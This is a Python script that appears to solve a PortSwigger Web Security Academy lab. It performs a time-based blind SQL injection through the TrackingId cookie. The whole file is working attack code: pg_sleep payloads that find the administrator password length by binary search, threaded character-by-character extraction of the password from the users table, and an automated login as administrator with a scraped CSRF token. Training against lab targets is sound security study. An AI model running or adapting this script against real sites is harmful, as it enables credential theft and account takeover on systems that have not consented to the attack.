import requests
from typing import Optional, Any
import urllib.parse
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

session = requests.Session()
BASE_URL = "https://0a4900d103be8007da8bbcb100c0008d.web-security-academy.net"
WORD_LIST = "0123456789abcdefghijklmnopqrstuvwxyz"

# Thread lock for printing
print_lock = threading.Lock()

def get_request(url: str, cookies: dict[str, Any] = None, timeout: int = 15) -> Optional[requests.Response]:
    try:
        return session.get(url, cookies=cookies, timeout=timeout)
    except requests.RequestException as e:
        with print_lock:
            print(f"Request error: {e}")
        return None

def payload_request(payload: str) -> Optional[requests.Response]:
    cookies = {
        "TrackingId": payload,
        "session": "aa"
    }
    return get_request(BASE_URL, cookies=cookies)

def test_char_at_position(position: int, char: str, pw_len: int) -> tuple[int, str, bool]:
    """Test if a specific character is at a specific position"""
    payload = (
        f"';select case when (username='administrator' and "
        f"substring(password,{position},1)='{char}') "
        f"then pg_sleep(8) else pg_sleep(0) end from users-- "
    )
    
    with print_lock:
        print(f"Testing position {position}: '{char}'")
    
    start = time.time()
    response = payload_request(urllib.parse.quote(payload))
    elapsed = time.time() - start
    
    if response and response.status_code == 200:
        is_match = elapsed > 7  # Allow some margin for network delay
        with print_lock:
            print(f"Position {position}, char '{char}': {'MATCH' if is_match else 'no match'} (time: {elapsed:.2f}s)")
        return position, char, is_match
    
    return position, char, False

def find_pw_len(max_len: int = 25) -> int:
    """Find password length using binary search"""
    print("Finding password length...")
    low = 1
    high = max_len
    
    while low <= high:
        mid = (low + high) // 2
        payload = (
            f"';select case when (username='administrator' and length(password)>{mid}) "
            f"then pg_sleep(5) else pg_sleep(0) end from users-- "
        )
        
        print(f"Testing length > {mid}")
        start = time.time()
        response = payload_request(urllib.parse.quote(payload))
        elapsed = time.time() - start
        
        if elapsed > 4:
            low = mid + 1
        else:
            high = mid - 1
    
    print(f"Password length found: {low}")
    return low

def find_pw_parallel(pw_len: int, max_workers: int = 10) -> str:
    """Find password using parallel character testing"""
    password = [''] * pw_len
    
    print(f"Starting parallel password discovery for {pw_len} characters...")
    
    # Create all position-character combinations
    tasks = []
    for position in range(1, pw_len + 1):
        for char in WORD_LIST:
            tasks.append((position, char))
    
    # Execute tests in parallel
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Submit all tasks
        future_to_task = {
            executor.submit(test_char_at_position, pos, char, pw_len): (pos, char)
            for pos, char in tasks
        }
        
        # Collect results
        found_chars = set()
        for future in as_completed(future_to_task):
            pos, char = future_to_task[future]
            try:
                position, character, is_match = future.result()
                if is_match:
                    password[position - 1] = character
                    found_chars.add(position)
                    with print_lock:
                        print(f"*** FOUND: Position {position} = '{character}' ***")
                    
                    # If we found all characters, we can break early
                    if len(found_chars) >= pw_len:
                        with print_lock:
                            print("All characters found! Stopping remaining tasks...")
                        # Cancel remaining futures
                        for f in future_to_task:
                            f.cancel()
                        break
                        
            except Exception as e:
                with print_lock:
                    print(f"Task failed for position {pos}, char '{char}': {e}")
    
    result_pw = ''.join(password)
    print(f"Discovered password: '{result_pw}'")
    return result_pw

def post_request(url: str, data: dict[str, Any], timeout: int = 10) -> Optional[requests.Response]:
    try:
        return session.post(url, data=data, timeout=timeout)
    except requests.RequestException as e:
        print(f"POST error: {e}")
        return None

def get_csrf(url: str) -> Optional[str]:
    response = get_request(url)
    if not response:
        return None
        
    try:
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(response.text, "html.parser")
        csrf_input = soup.find("input", {"name": "csrf"})
        if csrf_input:
            return csrf_input.get("value")
    except ImportError:
        print("BeautifulSoup not available, trying manual parsing...")
        # Simple regex fallback
        import re
        match = re.search(r'name="csrf"\s+value="([^"]+)"', response.text)
        if match:
            return match.group(1)
    
    return None

def login(pw: str):
    print(f"Attempting login with password: '{pw}'")
    url = BASE_URL + "/login"
    csrf_token = get_csrf(url)
    
    if not csrf_token:
        print("Failed to get CSRF token")
        return
    
    data = {
        "csrf": csrf_token,
        "username": "administrator",
        "password": pw
    }
    
    response = post_request(url, data)
    if response and "Your username is: administrator" in response.text:
        print("*** LOGIN SUCCESS! ***")
    else:
        print("Login failed")

def main():
    print("Starting SQL injection attack...")
    print("Target:", BASE_URL)
    
    # Find password length
    pw_len = find_pw_len()
    
    if pw_len <= 0:
        print("Failed to determine password length")
        return
    
    # Find password using parallel scanning
    pw = find_pw_parallel(pw_len, max_workers=8)  # Adjust workers as needed
    
    if pw and len(pw) == pw_len:
        print(f"Password discovery complete: '{pw}'")
        # Attempt login
        login(pw)
    else:
        print(f"Password discovery incomplete. Found: '{pw}'")

if __name__ == "__main__":
    main()